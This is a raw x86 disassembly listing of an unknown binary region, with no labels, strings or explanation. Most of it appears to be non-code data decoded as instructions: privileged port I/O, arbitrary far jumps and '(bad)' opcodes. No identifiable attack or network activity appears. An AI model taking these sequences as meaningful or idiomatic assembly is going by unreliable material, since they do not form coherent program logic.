  41293d:	and    DWORD PTR [eax-0x58],edx
  412940:	scas   eax,DWORD PTR es:[edi]
  412941:	seta   BYTE PTR [ebx-0x79]
  412945:	retf   0xf5c2
  412948:	jp     0x41293f
  41294a:	adc    DWORD PTR [edx-0x50],0x6ce22089
  412951:	call   0x3e06:0xcd15842
  412958:	xchg   ecx,edx
  41295a:	ret    0x9d52
  41295d:	xor    BYTE PTR [edx],bl
  41295f:	add    DWORD PTR [ecx+eax*2],edi
  412962:	int3   
  412963:	pop    ss
  412964:	aad    0x75
  412966:	jns    0x412908
  412968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412969:	add    cl,BYTE PTR [edi-0x534f6de6]
  41296f:	jmp    0x41296e
  412971:	lahf   
  412972:	sbb    ecx,DWORD PTR [ebp+0x744d2af1]
  412978:	ret    
  412979:	mov    edi,0x393cf013
  41297e:	jb     0x412937
  412980:	cmp    bl,al
  412982:	in     al,dx
  412983:	jmp    0x412960
  412985:	jae    0x41298e
  412987:	pop    ecx
  412988:	outs   dx,BYTE PTR ds:[esi]
  412989:	adc    eax,0x76737a31
  41298e:	outs   dx,BYTE PTR ds:[esi]
  41298f:	mov    WORD PTR [edx+0x28a2b92a],cs
  412995:	jo     0x4129f4
  412997:	enter  0x7e04,0x20
  41299b:	sahf   
  41299c:	ret    
  41299d:	adc    ebx,ecx
  41299f:	rcl    DWORD PTR [ecx-0x68],0xe7
  4129a3:	mov    edx,0x8c925360
  4129a8:	call   0x216a:0x7bdb3374
  4129af:	fild   QWORD PTR [ebp+0x11b79f1]
  4129b5:	shl    eax,0xef
  4129b8:	fisttp DWORD PTR [edi-0x64]
  4129bb:	sbb    eax,0xd14dd8af
  4129c1:	sti    
  4129c2:	xchg   edi,eax
  4129c3:	mov    eax,ds:0xbf72bd72
  4129c8:	dec    ebx
  4129c9:	sahf   
  4129ca:	mov    al,ds:0xd472f3e5
  4129cf:	fdivr  DWORD PTR [edx-0x506793]
  4129d5:	shl    ch,0x2e
  4129d8:	cmp    al,0x4
  4129da:	mov    edx,0x2534b7df
  4129df:	ins    DWORD PTR es:[edi],dx
  4129e0:	xor    DWORD PTR [edi-0xf86964b],edi
  4129e6:	fisubr DWORD PTR [edi+eax*8+0x62]
  4129ea:	jns    0x412a21
  4129ec:	outs   dx,BYTE PTR ds:[esi]
  4129ed:	outs   dx,DWORD PTR ds:[esi]
  4129ee:	loop   0x412a2f
  4129f0:	and    dh,al
  4129f2:	imul   BYTE PTR [esp+ebx*8+0x33]
  4129f6:	das    
  4129f7:	cmp    esp,ebx
  4129f9:	cmp    cl,BYTE PTR [eax+0x11]
  4129fc:	test   al,0xc7
  4129fe:	add    dl,ah
  412a00:	or     BYTE PTR gs:[ebx],bh
  412a03:	lea    edi,[ebp-0x1fd964b9]
  412a09:	or     bl,BYTE PTR [edx+0x66cd1a7f]
  412a0f:	or     DWORD PTR gs:[esi-0x5e],ecx
  412a13:	out    dx,eax
  412a14:	retf   0x289e
  412a17:	jecxz  0x412a24
  412a19:	dec    ebp
  412a1a:	test   DWORD PTR [ecx+0x53],ecx
  412a1d:	shr    BYTE PTR [ecx-0x2cd43bb8],0xaa
  412a24:	push   cs
  412a25:	aam    0x8
  412a27:	int    0xe4
  412a29:	inc    ebx
  412a2a:	sub    eax,0x83a9f7ea
  412a2f:	xchg   esi,eax
  412a30:	cwde   
  412a31:	aas    
  412a32:	cmp    DWORD PTR [ecx],esp
  412a34:	jb     0x412a67
  412a36:	sub    BYTE PTR ds:0x56973b9,0xde
  412a3d:	or     al,0x54
  412a3f:	addr16 mov dl,0xdc
  412a42:	cmp    eax,0x851edac4
  412a47:	cmp    ebp,ecx
  412a49:	dec    eax
  412a4a:	nop
  412a4b:	xor    eax,0xf6488757
  412a50:	fwait
  412a51:	dec    ebp
  412a52:	jecxz  0x412a45
  412a54:	lea    ecx,[ecx]
  412a56:	fistp  WORD PTR [ecx-0x7d107f8d]
  412a5c:	add    DWORD PTR [edx-0x24a0aaf0],edi
  412a62:	in     al,0xe2
  412a64:	mov    esi,esp
  412a66:	clc    
  412a67:	fcmovbe st,st(7)
  412a69:	push   0xffffffc3
  412a6b:	leave  
  412a6c:	test   eax,0x5d16c81
  412a71:	pushf  
  412a72:	cs retf 0x8005
  412a76:	mov    edi,?
  412a78:	aam    0xde
  412a7a:	mov    cl,0x6d
  412a7c:	out    0x4e,al
  412a7e:	jg     0x412a8d
  412a80:	and    al,0x8b
  412a82:	mov    dl,0x14
  412a84:	xchg   ecx,eax
  412a85:	and    BYTE PTR [eax],ch
  412a87:	push   0xffffffac
  412a89:	xchg   DWORD PTR [ebx],ecx
  412a8b:	jnp    0x412a38
  412a8d:	add    ebp,DWORD PTR [esi+0x6]
  412a90:	mov    ebp,0x867c5f09
  412a95:	cld    
  412a96:	pop    ds
  412a97:	sbb    al,0xb4
  412a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a9a:	xchg   ebx,eax
  412a9b:	popa   
  412a9c:	cwde   
  412a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a9e:	xchg   esp,eax
  412a9f:	in     al,0xcb
  412aa1:	sub    al,0xc9
  412aa3:	adc    ecx,DWORD PTR ds:0x57a465ef
  412aa9:	jno    0x412ab2
  412aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aac:	and    al,0xe0
  412aae:	daa    
  412aaf:	push   ebx
  412ab0:	call   0xa10d:0x19236778
  412ab7:	dec    esi
  412ab8:	mov    dl,0x1b
  412aba:	retf   0xaea0
  412abd:	hlt    
  412abe:	or     al,0x39
  412ac0:	aas    
  412ac1:	test   BYTE PTR [ebx],cl
  412ac3:	ret    
  412ac4:	int    0xb
  412ac6:	jb     0x412a61
  412ac8:	dec    edi
  412ac9:	lock es jnp 0x412af8
  412acd:	mov    ah,BYTE PTR [edi]
  412acf:	sub    al,0xf
  412ad1:	leave  
  412ad2:	mov    eax,ds:0xe4637dca
  412ad7:	sbb    eax,0xab055b41
  412adc:	xchg   ebp,eax
  412add:	stos   DWORD PTR es:[edi],eax
  412ade:	mov    eax,ds:0xc4fee9bf
  412ae3:	sbb    bl,BYTE PTR [ebp-0x39acba62]
  412ae9:	pop    ds
  412aea:	mov    al,ds:0xf39687ba
  412aef:	cdq    
  412af0:	sbb    al,0xd0
  412af2:	cmp    ebx,DWORD PTR [ebx-0x7991ab3e]
  412af8:	inc    esp
  412af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412afa:	mov    ecx,0xe1b8cd7b
  412aff:	je     0x412b5d
  412b01:	and    eax,0x23418c85
  412b06:	push   edi
  412b07:	jp     0x412a99
  412b09:	std    
  412b0a:	in     al,dx
  412b0b:	push   0x1d
  412b0d:	scas   eax,DWORD PTR es:[edi]
  412b0e:	pop    esi
  412b0f:	pushf  
  412b10:	aam    0x89
  412b12:	test   eax,esp
  412b14:	in     eax,dx
  412b15:	pop    ebx
  412b16:	ret    
  412b17:	cmp    ecx,eax
  412b19:	cmp    BYTE PTR [ecx+0x4fcd7fc],dh
  412b1f:	fidivr DWORD PTR [ecx*8-0x1b9bffa4]
  412b26:	xchg   ebp,eax
  412b27:	ja     0x412ad9
  412b29:	imul   eax,DWORD PTR [ebp-0x38],0x3f4a65cf
  412b30:	frstor [edx-0x60ffe3a]
  412b36:	sub    al,0x5d
  412b38:	mov    ah,0xab
  412b3a:	cmp    BYTE PTR [edx-0x440a2526],cl
  412b40:	aad    0xfe
  412b42:	cli    
  412b43:	push   ss
  412b44:	mov    bh,0xfc
  412b46:	cdq    
  412b47:	push   edi
  412b48:	arpl   WORD PTR [ecx],dx
  412b4a:	pop    esi
  412b4b:	mov    dh,0x61
  412b4d:	cmp    cl,BYTE PTR [esi-0x53]
  412b50:	fwait
  412b51:	sbb    eax,0x8d09afea
  412b56:	outs   dx,DWORD PTR ds:[esi]
  412b57:	dec    ebx
  412b58:	sbb    bl,BYTE PTR [edi+0x76]
  412b5b:	out    dx,al
  412b5c:	popf   
  412b5d:	inc    esp
  412b5e:	jecxz  0x412b18
  412b60:	adc    BYTE PTR [ebx],0x67
  412b63:	outs   dx,DWORD PTR ds:[esi]
  412b64:	(bad)  
  412b65:	push   ds
  412b66:	cmp    al,0x4e
  412b68:	icebp  
  412b69:	xchg   ebx,eax
  412b6a:	outs   dx,DWORD PTR ds:[esi]
  412b6b:	dec    ebp
  412b6c:	enter  0xef12,0x67
  412b70:	mov    al,ds:0x681554bc
  412b75:	push   ebp
  412b76:	cwde   
  412b77:	out    0xf1,eax
  412b79:	in     eax,0x76
  412b7b:	test   eax,0x83cc517f
  412b80:	and    al,0xd3
  412b82:	jnp    0x412bba
  412b84:	jmp    0xc882:0x5fc09fdf
  412b8b:	dec    ebx
  412b8c:	rcr    BYTE PTR ds:0xa784d130,1
  412b92:	xor    dl,ah
  412b94:	shl    DWORD PTR [eax+ebx*2-0x886da3f],0x6c
  412b9c:	fst    DWORD PTR [edx]
  412b9e:	fsub   QWORD PTR [eax-0x55]
  412ba1:	sub    dh,0x2e
  412ba4:	rol    DWORD PTR [esi+0x20],cl
  412ba7:	fidiv  WORD PTR [eax]
  412ba9:	repnz push cs
  412bab:	das    
  412bac:	mov    ecx,0x42f28b42
  412bb1:	jb     0x412b7e
  412bb3:	outs   dx,DWORD PTR ds:[esi]
  412bb4:	arpl   sp,dx
  412bb6:	mov    WORD PTR [edi+0x12],es
  412bb9:	mov    dl,0x83
  412bbb:	and    al,BYTE PTR [edx]
  412bbd:	mov    edi,0xf0d3f71f
  412bc2:	jecxz  0x412bb4
  412bc4:	scas   al,BYTE PTR es:[edi]
  412bc5:	aad    0xab
  412bc7:	stos   DWORD PTR es:[edi],eax
  412bc8:	loope  0x412c24
  412bca:	pushf  
  412bcb:	xchg   ebx,eax
  412bcc:	lods   eax,DWORD PTR ds:[esi]
  412bcd:	cmp    al,0x31
  412bcf:	mov    al,0xf5
  412bd1:	or     BYTE PTR [ebx],0xdc
  412bd4:	adc    al,0x53
  412bd6:	cli    
  412bd7:	iret   
  412bd8:	inc    edi
  412bd9:	pop    ds
  412bda:	imul   edx,esi,0x56
  412bdd:	inc    esp
  412bde:	ins    BYTE PTR es:[edi],dx
  412bdf:	in     al,0xb2
  412be1:	jle    0x412bd4
  412be3:	cmp    BYTE PTR [esp+ecx*8-0x4b7ae80f],0x31
  412beb:	sar    DWORD PTR [esi-0x223a1cf8],cl
  412bf1:	and    ebx,eax
  412bf3:	mov    cl,0xf8
  412bf5:	mov    gs,WORD PTR [edi+esi*4+0x55]
  412bf9:	rol    BYTE PTR [esi+0x61],1
  412bfc:	pop    esi
  412bfd:	sub    al,0x53
  412bff:	cmp    BYTE PTR [eax+0x54],cl
  412c02:	addr16 mov edx,0xf959a659
  412c08:	push   es
  412c09:	enter  0x871d,0x86
  412c0d:	hlt    
  412c0e:	sbb    dh,BYTE PTR [edi+0x6]
  412c11:	jb     0x412bef
  412c13:	jp     0x412bb4
  412c15:	mov    al,ds:0x112b21e4
  412c1a:	in     al,0x25
  412c1c:	sbb    DWORD PTR [edx-0x63ae310e],edx
  412c22:	das    
  412c23:	aad    0xdb
  412c25:	(bad)
  412c28:	dec    esi
  412c29:	lahf   
  412c2a:	enter  0xfbff,0x26
  412c2e:	pop    ecx
  412c2f:	iret   
  412c30:	inc    eax
  412c31:	popa   
  412c32:	adc    al,0x94
  412c34:	xchg   esp,eax
  412c35:	fisubr WORD PTR [ebx+ecx*8]
  412c38:	loop   0x412c04
  412c3a:	add    al,0xa1
  412c3c:	dec    esp
  412c3d:	pop    ds
  412c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c3f:	sti    
  412c40:	pop    esp
  412c41:	push   ebx
  412c42:	cli    
  412c43:	xor    edi,ebx
  412c45:	mov    gs,WORD PTR [ebp-0x6d]
  412c48:	scas   al,BYTE PTR es:[edi]
  412c49:	add    ecx,DWORD PTR ss:[edi+0x3d37d82a]
  412c50:	ins    DWORD PTR es:[edi],dx
  412c51:	cdq    
  412c52:	ds std 
  412c54:	imul   esp
  412c56:	test   eax,0x38db6aa8
  412c5b:	cli    
  412c5c:	sub    DWORD PTR [eax+edx*2-0x7f],esi
  412c60:	repnz or eax,0x2e0f47bf
  412c66:	adc    BYTE PTR [esi+0x2bf94a1d],0x50
  412c6d:	into   
  412c6e:	pusha  
  412c6f:	push   ss
  412c70:	dec    ebp
  412c71:	add    DWORD PTR [ebp-0x1c],edx
  412c74:	inc    eax
  412c75:	shr    BYTE PTR [ebp+0x69f69f85],cl
  412c7b:	sahf   
  412c7c:	daa    
  412c7d:	sti    
  412c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c7f:	daa    
  412c80:	popa   
  412c81:	dec    esp
  412c82:	and    al,0x4f
  412c84:	jnp    0x412cfa
  412c86:	mov    esi,0xd31d090c
  412c8b:	es (bad) 
  412c8e:	loopne 0x412c73
  412c90:	push   edx
  412c91:	xchg   esp,eax
  412c92:	in     eax,dx
  412c93:	pop    ecx
  412c94:	daa    
  412c95:	iret   
  412c96:	loope  0x412cf3
  412c98:	arpl   WORD PTR [ebx],bx
  412c9a:	call   0x7632afe3
  412c9f:	out    dx,al
  412ca0:	bswap  ebx
  412ca2:	push   eax
  412ca3:	addr16 fs xchg edi,eax
  412ca6:	test   BYTE PTR [edi],0xbd
  412ca9:	xor    edx,esi
  412cab:	ja     0x412ce8
  412cad:	inc    esp
  412cae:	fmul   DWORD PTR [edx-0x130120e2]
  412cb4:	mov    BYTE PTR [esi],ch
  412cb6:	es (bad) 
  412cb8:	ror    bl,0xd4
  412cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cbc:	inc    edi
  412cbd:	pop    es
  412cbe:	sti    
  412cbf:	xor    cl,ah
  412cc1:	loop   0x412c43
  412cc3:	scas   al,BYTE PTR es:[edi]
  412cc4:	jp     0x412d13
  412cc6:	mov    WORD PTR [esi+0x4baa938c],?
  412ccc:	jecxz  0x412cd2
  412cce:	sbb    al,0x33
  412cd0:	lods   eax,DWORD PTR ds:[esi]
  412cd1:	mov    cl,0x5b
  412cd3:	sbb    al,0x88
  412cd5:	add    al,0xae
  412cd7:	fist   DWORD PTR [esi+ecx*1+0x132573b5]
  412cde:	mov    edi,ecx
  412ce0:	cmp    BYTE PTR [esi-0x29],dl
  412ce3:	fbstp  TBYTE PTR [esi-0x3776484f]
  412ce9:	adc    esp,0x7935fa15
  412cef:	icebp  
  412cf0:	and    al,BYTE PTR [edi+ecx*8]
  412cf3:	es pop ds
  412cf5:	sbb    BYTE PTR [ecx-0x208f87c7],dl
  412cfb:	push   0x7c
  412cfd:	pop    esi
  412cfe:	sub    edx,ecx
  412d00:	xchg   esp,eax
  412d01:	add    ebp,ebp
  412d03:	mov    ds:0x653de5df,al
  412d08:	or     ecx,DWORD PTR [edi-0x15c698e5]
  412d0e:	jmp    0x9d500393
  412d13:	cmc    
  412d14:	cmp    eax,0xdb72abd7
  412d19:	dec    ecx
  412d1a:	mov    dl,0xa6
  412d1c:	xor    ebx,DWORD PTR [ebx+ebp*8+0x3c]
  412d20:	das    
  412d21:	out    0xe8,eax
  412d23:	arpl   WORD PTR [ebx],dx
  412d25:	leave  
  412d26:	add    ah,BYTE PTR [ebx]
  412d28:	fisttp DWORD PTR [ebx]
  412d2a:	mov    al,0xfb
  412d2c:	imul   ecx,DWORD PTR [edx-0x46],0x74
  412d30:	jnp    0x412d0c
  412d32:	inc    edx
  412d33:	dec    edx
  412d34:	daa    
  412d35:	sar    dl,cl
  412d37:	or     BYTE PTR [ecx+0x1855c81f],bh
  412d3d:	stos   DWORD PTR es:[edi],eax
  412d3e:	or     ebp,DWORD PTR [ebx]
  412d40:	popf   
  412d41:	lods   eax,DWORD PTR ds:[esi]
  412d42:	inc    edi
  412d43:	pusha  
  412d44:	mov    ss,WORD PTR [edx+0x74]
  412d47:	or     DWORD PTR [edx],edi
  412d49:	rol    BYTE PTR [si+0x38],cl
  412d4d:	retfw  
  412d4f:	sub    ebx,DWORD PTR [edx+0x3]
  412d52:	ret    
  412d53:	mov    ds:0x5a2e5c4b,al
  412d58:	mov    bl,0x46
  412d5a:	jp     0x412d2f
  412d5c:	jae    0x412d1f
  412d5e:	jbe    0x412d97
  412d60:	add    BYTE PTR [esi+0xfa4478c],bl
  412d66:	push   ds
  412d67:	inc    edi
  412d68:	in     al,dx
  412d69:	sbb    ah,BYTE PTR [edi]
  412d6b:	adc    al,0x28
  412d6d:	fcmovbe st,st(6)
  412d6f:	dec    eax
  412d70:	push   ecx
  412d71:	mov    ch,0x6f
  412d73:	push   ss
  412d74:	add    ecx,DWORD PTR [edi-0x14]
  412d77:	mov    bh,0xd6
  412d79:	mov    ah,0x27
  412d7b:	(bad)  
  412d7c:	adc    al,0x3a
  412d7e:	rcr    DWORD PTR [esi+0x5f],1
  412d81:	das    
  412d82:	push   0x3b
  412d84:	mov    bh,0xa7
  412d86:	in     al,0xe3
  412d88:	call   0x63aa38d2
  412d8d:	jmp    0x8ca173ef
  412d92:	rol    BYTE PTR [eax],1
  412d94:	sbb    al,0xbf
  412d96:	mov    eax,0xdebeb0af
  412d9b:	or     BYTE PTR [esi+0x23e7d0e7],dh
  412da1:	sbb    ebp,ebx
  412da3:	mov    al,ds:0xe193fcfd
  412da8:	cmp    esi,DWORD PTR ds:0xea321747
  412dae:	add    DWORD PTR [ebx-0x7b],0xef9a0409
  412db5:	add    ecx,DWORD PTR [ebx+0x720505f]
  412dbb:	jbe    0x412dd0
  412dbd:	mov    ah,BYTE PTR [eax-0x35]
  412dc0:	mov    esi,0x97f8c320
  412dc5:	out    dx,al
  412dc6:	outs   dx,DWORD PTR ds:[esi]
  412dc7:	dec    esi
  412dc8:	xchg   esp,eax
  412dc9:	daa    
  412dca:	or     ebp,ecx
  412dcc:	pop    ss
  412dcd:	imul   edi,DWORD PTR [eax],0x35c2ffe3
  412dd3:	lock mov cl,0xc9
  412dd6:	repnz mov al,ds:0x717848e8
  412ddc:	sbb    al,0xb1
  412dde:	push   ds
  412ddf:	push   esp
  412de0:	fidiv  DWORD PTR [edx-0x4fae9d4e]
  412de6:	pushf  
  412de7:	mov    al,ds:0xdf8ee30c
  412dec:	jns    0x412d89
  412dee:	push   ds
  412def:	mov    ds:0xc7278aa2,al
  412df4:	push   ss
  412df5:	(bad)  
  412df6:	in     al,dx
  412df7:	es pop ss
  412df9:	aad    0xe7
  412dfb:	ret    
  412dfc:	ds adc al,0x3f
  412dff:	mov    BYTE PTR [ecx],bh
  412e01:	loopne 0x412e0e
  412e03:	sub    eax,0xc224c681
  412e08:	lds    eax,FWORD PTR ds:[esi+0x2e]
  412e0c:	iret   
  412e0d:	fisttp DWORD PTR [eax*1-0x6f8390c9]
  412e14:	xchg   ebx,eax
  412e15:	push   0x5f
  412e17:	xchg   BYTE PTR [edi*4+0x20f2d804],ah
  412e1e:	mov    bh,0x39
  412e20:	pop    eax
  412e21:	pop    esi
  412e22:	rcl    BYTE PTR [esi+edx*4-0x626a0fb],cl
  412e29:	ds mov bl,0xf9
  412e2c:	pushfw 
  412e2e:	popa   
  412e2f:	into   
  412e30:	push   ebp
  412e31:	xchg   esi,eax
  412e32:	jne    0x412dc6
  412e34:	aas    
  412e35:	lea    esp,[esi]
  412e37:	mov    edx,0xec5ac7e1
  412e3c:	outs   dx,BYTE PTR ds:[esi]
  412e3d:	imul   ecx,ebx,0x84468847
  412e43:	jb     0x412df5
  412e45:	xchg   edi,eax
  412e46:	adc    al,0xe7
  412e48:	xor    al,0x90
  412e4a:	sti    
  412e4b:	pushf  
  412e4c:	lds    ecx,FWORD PTR [edx]
  412e4e:	push   esp
  412e4f:	mov    es,ebp
  412e51:	mov    ebx,0xcc4bc8fb
  412e56:	imul   esp,esi,0xffffffd8
  412e59:	adc    al,0x8b
  412e5b:	clc    
  412e5c:	std    
  412e5d:	push   cs
  412e5e:	enter  0xa30f,0x7b
  412e62:	add    BYTE PTR ds:0x9cc9ebaf,ch
  412e69:	ds mov dl,0x2c
  412e6c:	cmp    ah,BYTE PTR [esi]
  412e6e:	(bad)  [ecx]
  412e70:	xor    ebp,ecx
  412e72:	mov    ch,0x3c
  412e74:	jae    0x412e94
  412e76:	into   
  412e77:	pop    ss
  412e78:	dec    ebx
  412e79:	cwde   
  412e7a:	adc    eax,0xaaacf17e
  412e7f:	not    BYTE PTR [ebx]
  412e81:	jle    0x412e3f
  412e83:	test   DWORD PTR [esp+edi*1+0xf2a9d79],esp
  412e8a:	lods   al,BYTE PTR ds:[esi]
  412e8b:	ror    BYTE PTR [esi+0x4de42ed0],0xa1
  412e92:	in     eax,dx
  412e93:	popf   
  412e94:	xchg   edx,eax
  412e95:	clc    
  412e96:	pop    ss
  412e97:	mov    ds:0x823483e3,eax
  412e9c:	cmc    
  412e9d:	mov    edi,0xdc102ef6
  412ea2:	fild   QWORD PTR [eax]
  412ea4:	mov    eax,ds:0xb93830c
  412ea9:	add    DWORD PTR [ebx-0x28],ecx
  412eac:	sub    al,0x35
  412eae:	pop    ecx
  412eaf:	push   ecx
  412eb0:	add    bl,BYTE PTR [ebp+0x6a]
  412eb3:	xchg   ebp,eax
  412eb4:	fild   QWORD PTR es:[edx]
  412eb7:	retf   0x9caa
  412eba:	pop    esp
  412ebb:	push   esp
  412ebc:	inc    ecx
  412ebd:	push   ebp
  412ebe:	fwait
  412ebf:	sbb    cl,BYTE PTR [ebx+0x7f]
  412ec2:	cmc    
  412ec3:	lea    ebp,[ebp+0x3582d8b0]
  412ec9:	in     eax,dx
  412eca:	iret   
  412ecb:	mov    al,0x22
  412ecd:	data16 jae 0x412e96
  412ed0:	jbe    0x412f0b
  412ed2:	jl     0x412f27
  412ed4:	pop    ss
  412ed5:	push   esi
  412ed6:	js     0x412f50
  412ed8:	cdq    
  412ed9:	in     al,0xb0
  412edb:	shl    cl,0x8c
  412ede:	mov    ss:0x6af9d82d,al
  412ee4:	cmp    edi,ebx
  412ee6:	sar    BYTE PTR [edi+0x8aee4b4],1
  412eec:	sub    DWORD PTR ds:0x166d72b0,esp
  412ef2:	out    0x92,eax
  412ef4:	and    ecx,eax
  412ef6:	dec    ecx
  412ef7:	xchg   ebx,eax
  412ef8:	outs   dx,BYTE PTR ds:[esi]
  412ef9:	jg     0x412eaf
  412efb:	stc    
  412efc:	shr    BYTE PTR [ebx-0x462fcba9],1
  412f02:	pusha  
  412f03:	add    al,0xe4
  412f05:	mov    cl,0x62
  412f07:	pop    esp
  412f08:	fst    st(1)
  412f0a:	icebp  
  412f0b:	inc    BYTE PTR [ecx+eax*2]
  412f0e:	xor    ah,dl
  412f10:	mov    esp,0xa05e15c5
  412f15:	sub    al,0xfb
  412f17:	mov    al,ds:0x2511683d
  412f1c:	jbe    0x412f68
  412f1e:	js     0x412eac
  412f20:	repz out dx,al
  412f22:	adc    al,0x9a
  412f24:	jle    0x412ee4
  412f26:	inc    ebx
  412f27:	popa   
  412f28:	push   DWORD PTR [edi]
  412f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f2b:	pushf  
  412f2c:	rol    DWORD PTR [ecx+0x545f344],1
  412f32:	add    DWORD PTR [ebx-0x34],ebx
  412f35:	or     al,0x4d
  412f37:	hlt    
  412f38:	mov    ch,0xdb
  412f3a:	jnp    0x412f41
  412f3c:	aad    0x58
  412f3e:	out    dx,al
  412f3f:	ins    DWORD PTR es:[edi],dx
  412f40:	mov    WORD PTR [edi+esi*4],ds
  412f43:	jae    0x412fb8
  412f45:	xchg   ebp,eax
  412f46:	lea    esp,[eax+0x140bc2f8]
  412f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f4d:	cdq    
  412f4e:	mov    ecx,0x8655c4db
  412f53:	add    BYTE PTR ss:[edx-0x38],bh
  412f57:	mov    gs,WORD PTR [ecx+0x2aa2277e]
  412f5d:	xor    dl,BYTE PTR [ebp-0xda6f8a0]
  412f63:	mov    ebp,0xf7b9d354
  412f68:	cmp    BYTE PTR ds:0x6e928b5b,bl
  412f6e:	retf   
  412f6f:	lock or al,0xef
  412f72:	cwde   
  412f73:	pslld  mm7,QWORD PTR [eax+0x12]
  412f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f78:	fs imul edi,esp,0x183a5f2e
  412f7f:	mov    al,ds:0xe8111bdb
  412f84:	sti    
  412f85:	mov    ds:0xea4f5ed1,al
  412f8a:	scas   eax,DWORD PTR es:[edi]
  412f8b:	sbb    al,0x3
  412f8d:	aad    0x65
  412f8f:	fs push esp
  412f91:	mov    dl,0x2a
  412f93:	addr16 mov ch,0xa9
  412f96:	push   ss
  412f97:	inc    eax
  412f98:	xlat   BYTE PTR ds:[ebx]
  412f99:	add    eax,0x3d0a1b70
  412f9e:	(bad)  [eax+0x6aa83845]
  412fa4:	jns    0x412fdc
  412fa6:	or     BYTE PTR ds:[ebp-0x37],ch
  412faa:	push   es
  412fab:	inc    esi
  412fac:	sub    ebp,ebx
  412fae:	inc    esp
  412faf:	jmp    0x2c9a:0xe3916234
  412fb6:	retf   
  412fb7:	push   es
  412fb8:	(bad)  
  412fb9:	sbb    al,0xda
  412fbb:	xchg   esi,eax
  412fbc:	inc    edi
  412fbd:	ror    DWORD PTR [esi+ecx*2-0x6f],1
  412fc1:	sub    BYTE PTR ds:[ebx+0x4f],ah
  412fc5:	popf   
  412fc6:	jl     0x413031
  412fc8:	aas    
  412fc9:	cmc    
  412fca:	adc    al,0x23
  412fcc:	repz (bad) 
  412fce:	loopne 0x412fe6
  412fd0:	sbb    edi,DWORD PTR [eax+0x5a78d71]
  412fd6:	aaa    
  412fd7:	adc    DWORD PTR [ebp+0x51833b72],edi
  412fdd:	gs mov cl,0xf7
  412fe0:	fcom   QWORD PTR [esi+0x6d]
  412fe3:	and    eax,0xbe011764
  412fe8:	data16 ins BYTE PTR es:[edi],dx
  412fea:	(bad)  
  412feb:	mov    bh,0xa8
  412fed:	int3   
  412fee:	das    
  412fef:	xchg   esp,eax
  412ff0:	mov    dl,0x98
  412ff2:	jmp    0x350b:0x3a34f203
  412ff9:	loop   0x413075
  412ffb:	pop    ds
  412ffc:	mov    edx,0x97d58696
  413001:	cli    
  413002:	sub    DWORD PTR [eax+ecx*2+0x6a],edx
  413006:	hlt    
  413007:	ret    0x4c59
  41300a:	stos   BYTE PTR es:[edi],al
  41300b:	inc    ebp
  41300c:	or     DWORD PTR [eax-0x7a],ebp
  41300f:	jmp    0xe27d:0x46a0ef8f
  413016:	cmp    al,0x33
  413018:	add    al,0xf1
  41301a:	sub    eax,0xf7c1e96b
  41301f:	dec    ecx
  413020:	fcmove st,st(6)
  413022:	and    DWORD PTR [edi+ebx*1-0x8],ecx
  413026:	retf   
  413027:	jmp    0x5f36:0x93a24535
  41302e:	xor    dl,dh
  413030:	iret   
  413031:	ret    
  413032:	cmp    eax,0xf3936f6
  413037:	mov    ch,0xa8
  413039:	mov    bh,BYTE PTR [edx+ecx*1+0x408ba945]
  413040:	pop    esi
  413041:	inc    esp
  413042:	xchg   edi,eax
  413043:	mov    esp,0xc020bda6
  413048:	icebp  
  413049:	(bad)  
  41304a:	outs   dx,DWORD PTR ds:[esi]
  41304b:	jns    0x41305a
  41304d:	and    cl,BYTE PTR [edx-0x16]
  413050:	aam    0x6b
  413052:	xchg   BYTE PTR [ebp+0x159954b2],dl
  413058:	jo     0x413007
  41305a:	out    dx,eax
  41305b:	iret   
  41305c:	scas   al,BYTE PTR es:[edi]
  41305d:	scas   al,BYTE PTR es:[edi]
  41305e:	lds    ebp,FWORD PTR [eax+0x4f]
  413061:	mov    esp,0xd64002d0
  413066:	sub    edi,DWORD PTR [edi+0x4762646a]
  41306c:	push   cs
  41306d:	inc    eax
  41306e:	adc    DWORD PTR [eax-0x773637e],esp
  413074:	xchg   sp,ax
  413076:	sbb    edi,DWORD PTR ss:[edx+ebp*2-0x556bbdd2]
  41307e:	fxam   
  413080:	iret   
  413081:	fwait
  413082:	arpl   WORD PTR [edx+0x6a65b241],cx
  413088:	cmp    al,ch
  41308a:	ss dec esp
  41308c:	mov    cl,0xc9
  41308e:	cli    
  41308f:	into   
  413090:	(bad)  
  413091:	bnd je 0x41308a
  413094:	and    cl,ch
  413096:	mul    DWORD PTR [ecx-0x8d89f26]
  41309c:	and    ch,bl
  41309e:	outs   dx,DWORD PTR ds:[esi]
  41309f:	out    0x7c,eax
  4130a1:	adc    al,0xaa
  4130a3:	aaa    
  4130a4:	or     al,0x21
  4130a6:	mov    BYTE PTR [eax-0x6],cl
  4130a9:	add    BYTE PTR [ebp-0x20409c],bh
  4130af:	push   esp
  4130b0:	mov    esp,0x95e6793d
  4130b5:	pop    ebp
  4130b6:	shr    ch,cl
  4130b8:	adc    al,0xed
  4130ba:	les    ecx,FWORD PTR [edx]
  4130bc:	xchg   DWORD PTR [esi],ecx
  4130be:	jns    0x413094
  4130c0:	sbb    al,ch
  4130c2:	mov    bh,ch
  4130c4:	push   esp
  4130c5:	xlat   BYTE PTR ds:[ebx]
  4130c6:	call   0xa9e0:0x76b5c5df
  4130cd:	xchg   esi,eax
  4130ce:	test   eax,0x8670d38a
  4130d3:	inc    esi
  4130d4:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4130d6:	mov    bl,0xd
  4130d8:	pop    ds
  4130d9:	sar    DWORD PTR [ebx],1
  4130db:	mov    ah,0x9
  4130dd:	loopne 0x4130cc
  4130df:	jo     0x413098
  4130e1:	push   ds
  4130e2:	les    esp,FWORD PTR [ecx-0x6]
  4130e5:	push   0xffffffef
  4130e7:	dec    edx
  4130e8:	xor    ebx,DWORD PTR [ebx]
